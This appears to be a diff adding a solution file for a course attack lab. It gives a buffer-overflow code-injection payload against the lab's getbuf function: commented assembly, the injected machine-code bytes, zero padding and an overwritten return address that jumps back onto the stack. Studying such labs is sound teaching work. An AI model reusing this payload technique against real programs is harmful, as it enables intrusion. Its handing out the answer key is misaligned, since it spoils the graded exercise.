@@ -1,0 +1,40 @@
+/*
+   |------
+   |return address, we are supposed to
+   |overwrite this to inject our code.
+   |______
+   |
+   |getbuf stack frame
+   |
+   |when back here, we can do something nasty.
+   |
+   |we should back to here, the top of the stack, then we can have space to inject
+   |______
+*/
+
+
+/*
+    code injection
+
+	movl $0x59b997fa, %edi
+	pushq $0x4017ec
+	ret
+*/
+bf fa 97 b9 59
+68 ec 17 40 00
+c3
+
+/*
+   pad with zeros, until we reach $rip
+*/
+00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+00 00 00 00 00
+
+78 dc 61 55 00 00 00 00
+/*
+   back to the top of stack
+*/
